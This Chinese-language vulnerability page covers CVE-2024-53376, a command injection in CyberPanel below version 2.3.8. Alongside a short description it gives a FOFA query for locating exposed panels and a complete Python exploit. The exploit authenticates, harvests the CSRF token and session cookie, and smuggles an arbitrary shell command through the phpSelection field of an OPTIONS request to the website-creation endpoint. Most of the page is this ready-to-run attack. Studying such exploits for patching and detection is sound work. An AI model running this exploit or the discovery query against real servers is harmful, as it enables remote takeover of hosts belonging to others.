# CyberPanel需授权命令注入漏洞(CVE-2024-53376)

CyberPanel开源面板存在一个命令注入漏洞,该漏洞允许远程认证用户构造恶意请求执行任意命令,导致服务器失陷,攻击者可以使用一个HTTP选项请求指示网络服务器运行CyberPanel应用程序执行任何命令。

## 影响版本

CyberPanel 版本 < 2.3.8 

## fofa

```javascript
app="CyberPanel"
```

## poc

```python
#!/usr/bin/python3
# CVE-2024-53376
# Exploit Title: CyberPanel - Authenticated Remote Code Execution (RCE)
# Exploit Author: Ryan Putman
# Technical Details: https://github.com/ThottySploity/CVE-2024-53376
# Date: 2024-12-15
# Vendor Homepage: https://cyberpanel.net
# Tested On: Cyberpanel < 2.3.8
# Vulnerability Description:
#   Command injection vulnerability in the submitWebsiteCreation endpoint

import argparse, requests, json
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Disabling the SSL errors (since CyberPanel runs on a self signed cert)
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

arg_parser = argparse.ArgumentParser()
arg_parser.add_argument('-t', metavar='target', help='ip address or domain of Cyberpanel', required=True)
arg_parser.add_argument('-u', metavar='username', required=True)
arg_parser.add_argument('-p', metavar='password', required=True)
arg_parser.add_argument('-c', metavar='cmd', default='id > /tmp/rce #', help='command to execute')
args = arg_parser.parse_args()

# Obtaining the CSRF token used for authentication
csrf_token = requests.get(args.t, verify=False).headers.get('Set-Cookie').split(';')[0]

if len(csrf_token) > 0:
    print(f"[+] Obtained the following CSRFTOKEN: {csrf_token}")

payload = {
    "username": args.u,
    "password": args.p,
    "languageSelection": "english",
}

headers = {
    'Cookie': csrf_token,
    'Accept': 'application/json',
    'X-Csrftoken': csrf_token.replace('csrftoken=', ''),
    'Origin': 'https://localhost:8090',
    'Referer': 'https://localhost:8090/',
    'Connection': 'close'
}

# Obtaining the sessionId used for authorization.
sessionId = requests.post(
    "{}/verifyLogin".format(args.t),
    headers=headers,
    data=json.dumps(payload),
    verify=False,
).headers.get('Set-Cookie').split(';')[1].replace(" Path=/, ", "")

if len(sessionId) > 0:
    print(f"[+] Obtained the following sessionId: {sessionId}")

exploitHeaders = {
    'Cookie': f'{csrf_token}; django_language=en; {sessionId}',
    'Accept': 'application/json',
    'X-Csrftoken': csrf_token.replace('csrftoken=', ''),
    'Origin': 'https://localhost:8090',
    'Referer': 'https://localhost:8090/',
    'Connection': 'close'
}

exploitPayload = {
    "package": "Default",
    "domainName": "cyberpanel.net",
    "adminEmail": "cyberpanel@gmail.com",
    "phpSelection": f"PHP 8.0'; {args.c}; #",
    "ssl":0,
    "websiteOwner":"admin",
    "dkimCheck":0,
    "openBasedir":0,
    "mailDomain":0,
    "apacheBackend":0,
}

# Sending the exploit to the vulnerable endpoint
exploitRequest = requests.options(f"{args.t}/websites/submitWebsiteCreation", headers=exploitHeaders, data=json.dumps(exploitPayload), verify=False)

if exploitRequest.status_code == 200:
    print("[+] Exploit succeeded")
    print(f"[+] Executed: {args.c}")
```





## 漏洞来源

- https://github.com/ThottySploity/CVE-2024-53376